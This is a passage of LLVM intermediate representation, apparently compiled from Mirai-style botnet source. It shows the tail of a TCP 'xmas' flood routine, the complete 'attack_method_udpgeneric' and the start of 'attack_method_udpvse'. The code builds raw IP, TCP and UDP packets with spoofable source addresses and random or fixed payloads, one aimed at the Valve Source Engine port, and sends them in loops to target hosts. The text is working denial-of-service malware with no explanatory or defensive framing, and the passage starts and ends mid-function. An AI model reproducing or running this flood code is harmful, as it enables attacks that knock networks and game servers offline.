  %115 = call i64 @recvfrom(i32 %40, i8* nonnull %54, i64 256, i32 16384, %struct.sockaddr* nonnull %55, i32* nonnull %8) #11
  %116 = trunc i64 %115 to i32
  %117 = icmp eq i32 %116, -1
  br i1 %117, label %.loopexit150.loopexit, label %118

; <label>:118:                                    ; preds = %114
  %119 = load i32, i32* %56, align 4
  %120 = load i32, i32* %49, align 4
  %121 = icmp eq i32 %119, %120
  br i1 %121, label %122, label %220

; <label>:122:                                    ; preds = %118
  %sext = shl i64 %115, 32
  %123 = ashr exact i64 %sext, 32
  %124 = icmp ugt i64 %123, 40
  br i1 %124, label %125, label %220

; <label>:125:                                    ; preds = %122
  %126 = load i16, i16* %58, align 4
  %127 = load i16, i16* %52, align 2
  %128 = icmp eq i16 %126, %127
  br i1 %128, label %129, label %220

; <label>:129:                                    ; preds = %125
  %130 = load i16, i16* %60, align 16
  %131 = and i16 %130, 4608
  %132 = icmp eq i16 %131, 4608
  br i1 %132, label %133, label %213

; <label>:133:                                    ; preds = %129
  %134 = load i32, i32* %5, align 4
  %135 = sext i32 %134 to i64
  %136 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %12, i64 %135, i32 0
  store i32 %120, i32* %136, align 4
  %137 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %.0162, i64 0, i32 2
  %138 = load i32, i32* %137, align 4
  %139 = call i32 @ntohl(i32 %138) #12
  %140 = load i32, i32* %5, align 4
  %141 = sext i32 %140 to i64
  %142 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %12, i64 %141, i32 1
  store i32 %139, i32* %142, align 4
  %143 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %.0162, i64 0, i32 3
  %144 = load i32, i32* %143, align 4
  %145 = call i32 @ntohl(i32 %144) #12
  %146 = load i32, i32* %5, align 4
  %147 = sext i32 %146 to i64
  %148 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %12, i64 %147, i32 2
  store i32 %145, i32* %148, align 4
  %149 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %.0162, i64 0, i32 1
  %150 = load i16, i16* %149, align 2
  %151 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %12, i64 %147, i32 3
  store i16 %150, i16* %151, align 4
  %152 = load i16, i16* %52, align 2
  %153 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %12, i64 %147, i32 4
  store i16 %152, i16* %153, align 2
  %154 = call noalias i8* @malloc(i64 %62) #11
  %155 = load i32, i32* %5, align 4
  %156 = sext i32 %155 to i64
  %157 = getelementptr inbounds i8*, i8** %14, i64 %156
  store i8* %154, i8** %157, align 8
  %158 = getelementptr inbounds i8, i8* %154, i64 20
  %159 = bitcast i8* %158 to %struct.tcphdr*
  %160 = getelementptr inbounds i8, i8* %154, i64 40
  store i8 69, i8* %154, align 4
  %161 = getelementptr inbounds i8, i8* %154, i64 1
  store i8 %16, i8* %161, align 1
  %162 = call zeroext i16 @htons(i16 zeroext %63) #12
  %163 = getelementptr inbounds i8, i8* %154, i64 2
  %164 = bitcast i8* %163 to i16*
  store i16 %162, i16* %164, align 2
  %165 = call zeroext i16 @htons(i16 zeroext %18) #12
  %166 = getelementptr inbounds i8, i8* %154, i64 4
  %167 = bitcast i8* %166 to i16*
  store i16 %165, i16* %167, align 4
  %168 = getelementptr inbounds i8, i8* %154, i64 8
  store i8 %20, i8* %168, align 4
  br i1 %64, label %173, label %169

; <label>:169:                                    ; preds = %133
  %170 = call zeroext i16 @htons(i16 zeroext 16384) #12
  %171 = getelementptr inbounds i8, i8* %154, i64 6
  %172 = bitcast i8* %171 to i16*
  store i16 %170, i16* %172, align 2
  br label %173

; <label>:173:                                    ; preds = %133, %169
  %174 = getelementptr inbounds i8, i8* %154, i64 9
  store i8 6, i8* %174, align 1
  %175 = load i32, i32* @LOCAL_ADDR, align 4
  %176 = getelementptr inbounds i8, i8* %154, i64 12
  %177 = bitcast i8* %176 to i32*
  store i32 %175, i32* %177, align 4
  %178 = load i32, i32* %5, align 4
  %179 = sext i32 %178 to i64
  %180 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %12, i64 %179, i32 0
  %181 = load i32, i32* %180, align 4
  %182 = getelementptr inbounds i8, i8* %154, i64 16
  %183 = bitcast i8* %182 to i32*
  store i32 %181, i32* %183, align 4
  %184 = load i32, i32* %5, align 4
  %185 = sext i32 %184 to i64
  %186 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %12, i64 %185, i32 3
  %187 = load i16, i16* %186, align 4
  %188 = bitcast i8* %158 to i16*
  store i16 %187, i16* %188, align 4
  %189 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %12, i64 %185, i32 4
  %190 = load i16, i16* %189, align 2
  %191 = getelementptr inbounds i8, i8* %154, i64 22
  %192 = bitcast i8* %191 to i16*
  store i16 %190, i16* %192, align 2
  %193 = load i32, i32* %5, align 4
  %194 = sext i32 %193 to i64
  %195 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %12, i64 %194, i32 2
  %196 = load i32, i32* %195, align 4
  %197 = getelementptr inbounds i8, i8* %154, i64 24
  %198 = bitcast i8* %197 to i32*
  store i32 %196, i32* %198, align 4
  %199 = load i32, i32* %5, align 4
  %200 = sext i32 %199 to i64
  %201 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %12, i64 %200, i32 1
  %202 = load i32, i32* %201, align 4
  %203 = getelementptr inbounds i8, i8* %154, i64 28
  %204 = bitcast i8* %203 to i32*
  store i32 %202, i32* %204, align 4
  %205 = getelementptr inbounds i8, i8* %154, i64 32
  %206 = bitcast i8* %205 to i16*
  %207 = load i16, i16* %206, align 4
  %208 = getelementptr inbounds i8, i8* %154, i64 34
  %209 = bitcast i8* %208 to i16*
  store i16 0, i16* %209, align 2
  %210 = and i16 %207, -16369
  %211 = or i16 %210, 128
  %212 = or i16 %80, %211
  store i16 %212, i16* %206, align 4
  call void @rand_str(i8* %160, i32 %37)
  br label %.loopexit152

; <label>:213:                                    ; preds = %129
  %214 = and i16 %130, 1280
  %215 = icmp eq i16 %214, 0
  br i1 %215, label %220, label %216

; <label>:216:                                    ; preds = %213
  %217 = call i32 @close(i32 %94) #11
  br label %.backedge

.backedge:                                        ; preds = %216, %224
  %218 = call i32 @socket(i32 2, i32 1, i32 0) #11
  %219 = icmp eq i32 %218, -1
  br i1 %219, label %.loopexit152.loopexit, label %.lr.ph161

; <label>:220:                                    ; preds = %213, %125, %122, %118
  %221 = call i64 @time(i64* null) #11
  %222 = sub nsw i64 %221, %113
  %223 = icmp sgt i64 %222, 10
  br i1 %223, label %224, label %114

; <label>:224:                                    ; preds = %220
  %225 = call i32 @close(i32 %94) #11
  br label %.backedge

.loopexit152.loopexit:                            ; preds = %.backedge
  br label %.loopexit152

.loopexit152:                                     ; preds = %.loopexit152.loopexit, %.preheader151, %173
  %.1 = phi %struct.tcphdr* [ %159, %173 ], [ %.0162, %.preheader151 ], [ %.0162, %.loopexit152.loopexit ]
  %226 = load i32, i32* %5, align 4
  %227 = add nsw i32 %226, 1
  store i32 %227, i32* %5, align 4
  %228 = icmp slt i32 %227, %46
  br i1 %228, label %.preheader151, label %.preheader.loopexit

.loopexit.loopexit:                               ; preds = %240
  br label %.loopexit.backedge

.loopexit:                                        ; preds = %.loopexit.backedge, %.preheader
  store i32 0, i32* %5, align 4
  br i1 %85, label %.loopexit.backedge, label %.lr.ph.preheader

.loopexit.backedge:                               ; preds = %.loopexit, %.loopexit.loopexit
  br label %.loopexit

.lr.ph.preheader:                                 ; preds = %.loopexit
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %240
  %storemerge139160 = phi i32 [ %278, %240 ], [ 0, %.lr.ph.preheader ]
  %229 = sext i32 %storemerge139160 to i64
  %230 = getelementptr inbounds i8*, i8** %14, i64 %229
  %231 = load i8*, i8** %230, align 8
  %232 = bitcast i8* %231 to %struct.iphdr*
  %233 = getelementptr inbounds i8, i8* %231, i64 20
  %234 = getelementptr inbounds i8, i8* %231, i64 40
  br i1 %87, label %235, label %238

; <label>:235:                                    ; preds = %.lr.ph
  %236 = getelementptr inbounds i8, i8* %231, i64 4
  %237 = bitcast i8* %236 to i16*
  store i16 0, i16* %237, align 4
  br label %238

; <label>:238:                                    ; preds = %235, %.lr.ph
  br i1 %88, label %240, label %239

; <label>:239:                                    ; preds = %238
  call void @rand_str(i8* %234, i32 %37)
  br label %240

; <label>:240:                                    ; preds = %238, %239
  %241 = getelementptr inbounds i8, i8* %231, i64 10
  %242 = bitcast i8* %241 to i16*
  store i16 0, i16* %242, align 2
  %243 = bitcast i8* %231 to i16*
  %244 = call zeroext i16 @checksum_generic(i16* %243, i32 20)
  store i16 %244, i16* %242, align 2
  %245 = load i32, i32* %5, align 4
  %246 = sext i32 %245 to i64
  %247 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %12, i64 %246, i32 1
  %248 = load i32, i32* %247, align 4
  %249 = add i32 %248, 1
  store i32 %249, i32* %247, align 4
  %250 = trunc i32 %248 to i16
  %251 = call zeroext i16 @htons(i16 zeroext %250) #12
  %252 = zext i16 %251 to i32
  %253 = getelementptr inbounds i8, i8* %231, i64 24
  %254 = bitcast i8* %253 to i32*
  store i32 %252, i32* %254, align 4
  %255 = load i32, i32* %5, align 4
  %256 = sext i32 %255 to i64
  %257 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %12, i64 %256, i32 2
  %258 = load i32, i32* %257, align 4
  %259 = trunc i32 %258 to i16
  %260 = call zeroext i16 @htons(i16 zeroext %259) #12
  %261 = zext i16 %260 to i32
  %262 = getelementptr inbounds i8, i8* %231, i64 28
  %263 = bitcast i8* %262 to i32*
  store i32 %261, i32* %263, align 4
  %264 = getelementptr inbounds i8, i8* %231, i64 36
  %265 = bitcast i8* %264 to i16*
  store i16 0, i16* %265, align 4
  %266 = call zeroext i16 @htons(i16 zeroext %91) #12
  %267 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %232, i8* %233, i16 zeroext %266, i32 %92)
  store i16 %267, i16* %265, align 4
  %268 = getelementptr inbounds i8, i8* %231, i64 22
  %269 = bitcast i8* %268 to i16*
  %270 = load i16, i16* %269, align 2
  %271 = load i32, i32* %5, align 4
  %272 = sext i32 %271 to i64
  %273 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %272, i32 0, i32 1
  store i16 %270, i16* %273, align 2
  %274 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %272, i32 0
  %275 = bitcast %struct.sockaddr_in* %274 to %struct.sockaddr*
  %276 = call i64 @sendto(i32 %40, i8* %231, i64 %93, i32 16384, %struct.sockaddr* %275, i32 16) #11
  %277 = load i32, i32* %5, align 4
  %278 = add nsw i32 %277, 1
  store i32 %278, i32* %5, align 4
  %279 = icmp slt i32 %278, %46
  br i1 %279, label %.lr.ph, label %.loopexit.loopexit

.loopexit150.loopexit:                            ; preds = %114
  br label %.loopexit150

.loopexit150:                                     ; preds = %.loopexit150.loopexit, %4, %81
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_udpgeneric(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca i32, align 4
  %6 = zext i8 %0 to i64
  %7 = tail call noalias i8* @calloc(i64 %6, i64 8) #11
  %8 = bitcast i8* %7 to i8**
  %9 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 2, i32 0)
  %10 = trunc i32 %9 to i8
  %11 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 3, i32 65535)
  %12 = trunc i32 %11 to i16
  %13 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 4, i32 64)
  %14 = trunc i32 %13 to i8
  %15 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 5, i32 0)
  %16 = trunc i32 %15 to i8
  %17 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 6, i32 65535)
  %18 = trunc i32 %17 to i16
  %19 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 65535)
  %20 = trunc i32 %19 to i16
  %21 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 0, i32 512)
  %22 = trunc i32 %21 to i16
  %23 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 1, i32 1)
  %24 = trunc i32 %23 to i8
  %25 = load i32, i32* @LOCAL_ADDR, align 4
  %26 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 25, i32 %25)
  %27 = and i32 %21, 65535
  %28 = icmp ugt i32 %27, 1460
  %. = select i1 %28, i16 1460, i16 %22
  %29 = tail call i32 @socket(i32 2, i32 3, i32 17) #11
  %30 = icmp eq i32 %29, -1
  br i1 %30, label %148, label %31

; <label>:31:                                     ; preds = %4
  store i32 1, i32* %5, align 4
  %32 = bitcast i32* %5 to i8*
  %33 = call i32 @setsockopt(i32 %29, i32 0, i32 3, i8* nonnull %32, i32 4) #11
  %34 = icmp eq i32 %33, -1
  br i1 %34, label %42, label %.preheader84

.preheader84:                                     ; preds = %31
  store i32 0, i32* %5, align 4
  %35 = zext i8 %0 to i32
  %36 = icmp eq i8 %0, 0
  br i1 %36, label %.preheader, label %.lr.ph86

.lr.ph86:                                         ; preds = %.preheader84
  %37 = add i16 %., 28
  %38 = icmp eq i8 %16, 0
  %39 = add i16 %., 8
  %.promoted = load i32, i32* %5, align 4
  %40 = sext i32 %.promoted to i64
  %41 = zext i8 %0 to i64
  br label %59

; <label>:42:                                     ; preds = %31
  %43 = call i32 @close(i32 %29) #11
  br label %148

..preheader_crit_edge:                            ; preds = %75
  %44 = trunc i64 %indvars.iv.next to i32
  store i32 %44, i32* %5, align 4
  br label %.preheader

.preheader:                                       ; preds = %.preheader84, %..preheader_crit_edge
  %45 = icmp eq i8 %0, 0
  %46 = icmp eq i32 %26, -1
  %47 = and i32 %11, 65535
  %48 = icmp eq i32 %47, 65535
  %49 = and i32 %17, 65535
  %50 = icmp eq i32 %49, 65535
  %51 = and i32 %19, 65535
  %52 = icmp eq i32 %51, 65535
  %53 = icmp eq i8 %24, 0
  %54 = zext i16 %. to i64
  %55 = add nuw nsw i64 %54, 8
  %56 = trunc i64 %55 to i32
  %57 = add nuw nsw i64 %54, 28
  %58 = zext i16 %. to i32
  br label %.loopexit

; <label>:59:                                     ; preds = %.lr.ph86, %75
  %indvars.iv = phi i64 [ %40, %.lr.ph86 ], [ %indvars.iv.next, %75 ]
  %60 = call noalias i8* @calloc(i64 1510, i64 1) #11
  %61 = getelementptr inbounds i8*, i8** %8, i64 %indvars.iv
  store i8* %60, i8** %61, align 8
  %62 = getelementptr inbounds i8, i8* %60, i64 20
  store i8 69, i8* %60, align 4
  %63 = getelementptr inbounds i8, i8* %60, i64 1
  store i8 %10, i8* %63, align 1
  %64 = call zeroext i16 @htons(i16 zeroext %37) #12
  %65 = getelementptr inbounds i8, i8* %60, i64 2
  %66 = bitcast i8* %65 to i16*
  store i16 %64, i16* %66, align 2
  %67 = call zeroext i16 @htons(i16 zeroext %12) #12
  %68 = getelementptr inbounds i8, i8* %60, i64 4
  %69 = bitcast i8* %68 to i16*
  store i16 %67, i16* %69, align 4
  %70 = getelementptr inbounds i8, i8* %60, i64 8
  store i8 %14, i8* %70, align 4
  br i1 %38, label %75, label %71

; <label>:71:                                     ; preds = %59
  %72 = call zeroext i16 @htons(i16 zeroext 16384) #12
  %73 = getelementptr inbounds i8, i8* %60, i64 6
  %74 = bitcast i8* %73 to i16*
  store i16 %72, i16* %74, align 2
  br label %75

; <label>:75:                                     ; preds = %59, %71
  %76 = getelementptr inbounds i8, i8* %60, i64 9
  store i8 17, i8* %76, align 1
  %77 = getelementptr inbounds i8, i8* %60, i64 12
  %78 = bitcast i8* %77 to i32*
  store i32 %26, i32* %78, align 4
  %79 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 1
  %80 = load i32, i32* %79, align 4
  %81 = getelementptr inbounds i8, i8* %60, i64 16
  %82 = bitcast i8* %81 to i32*
  store i32 %80, i32* %82, align 4
  %83 = call zeroext i16 @htons(i16 zeroext %18) #12
  %84 = bitcast i8* %62 to i16*
  store i16 %83, i16* %84, align 2
  %85 = call zeroext i16 @htons(i16 zeroext %20) #12
  %86 = getelementptr inbounds i8, i8* %60, i64 22
  %87 = bitcast i8* %86 to i16*
  store i16 %85, i16* %87, align 2
  %88 = call zeroext i16 @htons(i16 zeroext %39) #12
  %89 = getelementptr inbounds i8, i8* %60, i64 24
  %90 = bitcast i8* %89 to i16*
  store i16 %88, i16* %90, align 2
  %indvars.iv.next = add nsw i64 %indvars.iv, 1
  %91 = icmp slt i64 %indvars.iv.next, %41
  br i1 %91, label %59, label %..preheader_crit_edge

.loopexit.loopexit:                               ; preds = %125
  br label %.loopexit.backedge

.loopexit:                                        ; preds = %.loopexit.backedge, %.preheader
  store i32 0, i32* %5, align 4
  br i1 %45, label %.loopexit.backedge, label %.lr.ph.preheader

.loopexit.backedge:                               ; preds = %.loopexit, %.loopexit.loopexit
  br label %.loopexit

.lr.ph.preheader:                                 ; preds = %.loopexit
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %125
  %storemerge8385 = phi i32 [ %146, %125 ], [ 0, %.lr.ph.preheader ]
  %92 = sext i32 %storemerge8385 to i64
  %93 = getelementptr inbounds i8*, i8** %8, i64 %92
  %94 = load i8*, i8** %93, align 8
  %95 = bitcast i8* %94 to %struct.iphdr*
  %96 = getelementptr inbounds i8, i8* %94, i64 20
  %97 = getelementptr inbounds i8, i8* %94, i64 28
  %98 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %92, i32 2
  %99 = load i8, i8* %98, align 4
  %100 = icmp ult i8 %99, 32
  br i1 %100, label %101, label %108

; <label>:101:                                    ; preds = %.lr.ph
  %102 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %92, i32 1
  %103 = load i32, i32* %102, align 4
  %104 = call i32 @ntohl(i32 %103) #12
  %105 = call i32 @htonl(i32 %104) #12
  %106 = getelementptr inbounds i8, i8* %94, i64 16
  %107 = bitcast i8* %106 to i32*
  store i32 %105, i32* %107, align 4
  br label %108

; <label>:108:                                    ; preds = %101, %.lr.ph
  br i1 %46, label %109, label %112

; <label>:109:                                    ; preds = %108
  %110 = getelementptr inbounds i8, i8* %94, i64 12
  %111 = bitcast i8* %110 to i32*
  store i32 0, i32* %111, align 4
  br label %112

; <label>:112:                                    ; preds = %109, %108
  br i1 %48, label %113, label %116

; <label>:113:                                    ; preds = %112
  %114 = getelementptr inbounds i8, i8* %94, i64 4
  %115 = bitcast i8* %114 to i16*
  store i16 0, i16* %115, align 4
  br label %116

; <label>:116:                                    ; preds = %113, %112
  br i1 %50, label %117, label %119

; <label>:117:                                    ; preds = %116
  %118 = bitcast i8* %96 to i16*
  store i16 0, i16* %118, align 2
  br label %119

; <label>:119:                                    ; preds = %117, %116
  br i1 %52, label %120, label %123

; <label>:120:                                    ; preds = %119
  %121 = getelementptr inbounds i8, i8* %94, i64 22
  %122 = bitcast i8* %121 to i16*
  store i16 0, i16* %122, align 2
  br label %123

; <label>:123:                                    ; preds = %120, %119
  br i1 %53, label %125, label %124

; <label>:124:                                    ; preds = %123
  call void @rand_str(i8* %97, i32 %58)
  br label %125

; <label>:125:                                    ; preds = %123, %124
  %126 = getelementptr inbounds i8, i8* %94, i64 10
  %127 = bitcast i8* %126 to i16*
  store i16 0, i16* %127, align 2
  %128 = bitcast i8* %94 to i16*
  %129 = call zeroext i16 @checksum_generic(i16* %128, i32 20)
  store i16 %129, i16* %127, align 2
  %130 = getelementptr inbounds i8, i8* %94, i64 26
  %131 = bitcast i8* %130 to i16*
  store i16 0, i16* %131, align 2
  %132 = getelementptr inbounds i8, i8* %94, i64 24
  %133 = bitcast i8* %132 to i16*
  %134 = load i16, i16* %133, align 2
  %135 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %95, i8* %96, i16 zeroext %134, i32 %56)
  store i16 %135, i16* %131, align 2
  %136 = getelementptr inbounds i8, i8* %94, i64 22
  %137 = bitcast i8* %136 to i16*
  %138 = load i16, i16* %137, align 2
  %139 = load i32, i32* %5, align 4
  %140 = sext i32 %139 to i64
  %141 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %140, i32 0, i32 1
  store i16 %138, i16* %141, align 2
  %142 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %140, i32 0
  %143 = bitcast %struct.sockaddr_in* %142 to %struct.sockaddr*
  %144 = call i64 @sendto(i32 %29, i8* %94, i64 %57, i32 16384, %struct.sockaddr* %143, i32 16) #11
  %145 = load i32, i32* %5, align 4
  %146 = add nsw i32 %145, 1
  store i32 %146, i32* %5, align 4
  %147 = icmp slt i32 %146, %35
  br i1 %147, label %.lr.ph, label %.loopexit.loopexit

; <label>:148:                                    ; preds = %4, %42
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_udpvse(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = zext i8 %0 to i64
  %8 = tail call noalias i8* @calloc(i64 %7, i64 8) #11
  %9 = bitcast i8* %8 to i8**
  %10 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 2, i32 0)
  %11 = trunc i32 %10 to i8
  %12 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 3, i32 65535)
  %13 = trunc i32 %12 to i16
  %14 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 4, i32 64)
  %15 = trunc i32 %14 to i8
  %16 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 5, i32 0)
  %17 = trunc i32 %16 to i8
  %18 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 6, i32 65535)
  %19 = trunc i32 %18 to i16
  %20 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 27015)
  %21 = trunc i32 %20 to i16
  tail call void @table_unlock_val(i8 zeroext 20)
  %22 = call i8* @table_retrieve_val(i32 20, i32* nonnull %6)
  %23 = call i32 @socket(i32 2, i32 3, i32 17) #11
  %24 = icmp eq i32 %23, -1
  br i1 %24, label %147, label %25

; <label>:25:                                     ; preds = %4
  store i32 1, i32* %5, align 4
  %26 = bitcast i32* %5 to i8*
  %27 = call i32 @setsockopt(i32 %23, i32 0, i32 3, i8* nonnull %26, i32 4) #11
  %28 = icmp eq i32 %27, -1
  br i1 %28, label %32, label %.preheader71

.preheader71:                                     ; preds = %25
  store i32 0, i32* %5, align 4
  %29 = zext i8 %0 to i32
  %30 = icmp eq i8 %0, 0
  br i1 %30, label %.preheader, label %.lr.ph73

.lr.ph73:                                         ; preds = %.preheader71
  %31 = icmp eq i8 %17, 0
  br label %41

; <label>:32:                                     ; preds = %25
  %33 = call i32 @close(i32 %23) #11
  br label %147

.preheader.loopexit:                              ; preds = %63
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit, %.preheader71
  %34 = icmp eq i8 %0, 0
  %35 = and i32 %12, 65535
  %36 = icmp eq i32 %35, 65535
  %37 = and i32 %18, 65535
  %38 = icmp eq i32 %37, 65535
  %39 = and i32 %20, 65535
  %40 = icmp eq i32 %39, 65535
  br label %.loopexit

; <label>:41:                                     ; preds = %.lr.ph73, %63
  %42 = call noalias i8* @calloc(i64 128, i64 1) #11
  %43 = load i32, i32* %5, align 4
  %44 = sext i32 %43 to i64
  %45 = getelementptr inbounds i8*, i8** %9, i64 %44
  store i8* %42, i8** %45, align 8
  %46 = getelementptr inbounds i8, i8* %42, i64 20
  %47 = getelementptr inbounds i8, i8* %42, i64 28
  store i8 69, i8* %42, align 4
  %48 = getelementptr inbounds i8, i8* %42, i64 1
  store i8 %11, i8* %48, align 1
  %49 = load i32, i32* %6, align 4
  %50 = trunc i32 %49 to i16
  %51 = add i16 %50, 32
  %52 = call zeroext i16 @htons(i16 zeroext %51) #12
  %53 = getelementptr inbounds i8, i8* %42, i64 2
  %54 = bitcast i8* %53 to i16*
  store i16 %52, i16* %54, align 2
  %55 = call zeroext i16 @htons(i16 zeroext %13) #12
  %56 = getelementptr inbounds i8, i8* %42, i64 4
  %57 = bitcast i8* %56 to i16*
  store i16 %55, i16* %57, align 4
  %58 = getelementptr inbounds i8, i8* %42, i64 8
  store i8 %15, i8* %58, align 4
  br i1 %31, label %63, label %59

; <label>:59:                                     ; preds = %41
  %60 = call zeroext i16 @htons(i16 zeroext 16384) #12
  %61 = getelementptr inbounds i8, i8* %42, i64 6
  %62 = bitcast i8* %61 to i16*
  store i16 %60, i16* %62, align 2
  br label %63

; <label>:63:                                     ; preds = %41, %59
  %64 = getelementptr inbounds i8, i8* %42, i64 9
  store i8 17, i8* %64, align 1
  %65 = load i32, i32* @LOCAL_ADDR, align 4
  %66 = getelementptr inbounds i8, i8* %42, i64 12
  %67 = bitcast i8* %66 to i32*
  store i32 %65, i32* %67, align 4
  %68 = load i32, i32* %5, align 4
  %69 = sext i32 %68 to i64
  %70 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %69, i32 1
  %71 = load i32, i32* %70, align 4
  %72 = getelementptr inbounds i8, i8* %42, i64 16
  %73 = bitcast i8* %72 to i32*
  store i32 %71, i32* %73, align 4
  %74 = call zeroext i16 @htons(i16 zeroext %19) #12
  %75 = bitcast i8* %46 to i16*
  store i16 %74, i16* %75, align 2
  %76 = call zeroext i16 @htons(i16 zeroext %21) #12
  %77 = getelementptr inbounds i8, i8* %42, i64 22
  %78 = bitcast i8* %77 to i16*
  store i16 %76, i16* %78, align 2
  %79 = load i32, i32* %6, align 4
  %80 = trunc i32 %79 to i16
  %81 = add i16 %80, 12
  %82 = call zeroext i16 @htons(i16 zeroext %81) #12
  %83 = getelementptr inbounds i8, i8* %42, i64 24
  %84 = bitcast i8* %83 to i16*
  store i16 %82, i16* %84, align 2
  %85 = bitcast i8* %47 to i32*
  store i32 -1, i32* %85, align 4
  %86 = getelementptr inbounds i8, i8* %42, i64 32
  %87 = load i32, i32* %6, align 4
  call void @util_memcpy(i8* %86, i8* %22, i32 %87) #11
  %88 = load i32, i32* %5, align 4
  %89 = add nsw i32 %88, 1
  store i32 %89, i32* %5, align 4
  %90 = icmp slt i32 %89, %29
  br i1 %90, label %41, label %.preheader.loopexit

.loopexit.loopexit:                               ; preds = %117
  br label %.loopexit.backedge

.loopexit:                                        ; preds = %.loopexit.backedge, %.preheader
  store i32 0, i32* %5, align 4
  br i1 %34, label %.loopexit.backedge, label %.lr.ph.preheader

.loopexit.backedge:                               ; preds = %.loopexit, %.loopexit.loopexit
  br label %.loopexit

.lr.ph.preheader:                                 ; preds = %.loopexit
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %117
  %storemerge7072 = phi i32 [ %145, %117 ], [ 0, %.lr.ph.preheader ]
  %91 = sext i32 %storemerge7072 to i64
  %92 = getelementptr inbounds i8*, i8** %9, i64 %91
  %93 = load i8*, i8** %92, align 8
  %94 = bitcast i8* %93 to %struct.iphdr*
  %95 = getelementptr inbounds i8, i8* %93, i64 20
  %96 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %91, i32 2
  %97 = load i8, i8* %96, align 4
  %98 = icmp ult i8 %97, 32
  br i1 %98, label %99, label %106

; <label>:99:                                     ; preds = %.lr.ph
  %100 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %91, i32 1
  %101 = load i32, i32* %100, align 4
  %102 = call i32 @ntohl(i32 %101) #12
  %103 = call i32 @htonl(i32 %102) #12
  %104 = getelementptr inbounds i8, i8* %93, i64 16
  %105 = bitcast i8* %104 to i32*
  store i32 %103, i32* %105, align 4
  br label %106

; <label>:106:                                    ; preds = %99, %.lr.ph
  br i1 %36, label %107, label %110

; <label>:107:                                    ; preds = %106
  %108 = getelementptr inbounds i8, i8* %93, i64 4
  %109 = bitcast i8* %108 to i16*
  store i16 0, i16* %109, align 4
  br label %110

; <label>:110:                                    ; preds = %107, %106
  br i1 %38, label %111, label %113

; <label>:111:                                    ; preds = %110
  %112 = bitcast i8* %95 to i16*
  store i16 0, i16* %112, align 2
  br label %113

; <label>:113:                                    ; preds = %111, %110
  br i1 %40, label %114, label %117

; <label>:114:                                    ; preds = %113
  %115 = getelementptr inbounds i8, i8* %93, i64 22
  %116 = bitcast i8* %115 to i16*
  store i16 0, i16* %116, align 2
  br label %117

; <label>:117:                                    ; preds = %114, %113
  %118 = getelementptr inbounds i8, i8* %93, i64 10
  %119 = bitcast i8* %118 to i16*
  store i16 0, i16* %119, align 2
  %120 = bitcast i8* %93 to i16*
  %121 = call zeroext i16 @checksum_generic(i16* %120, i32 20)
  store i16 %121, i16* %119, align 2
  %122 = getelementptr inbounds i8, i8* %93, i64 26
  %123 = bitcast i8* %122 to i16*
  store i16 0, i16* %123, align 2
  %124 = getelementptr inbounds i8, i8* %93, i64 24
  %125 = bitcast i8* %124 to i16*
  %126 = load i16, i16* %125, align 2
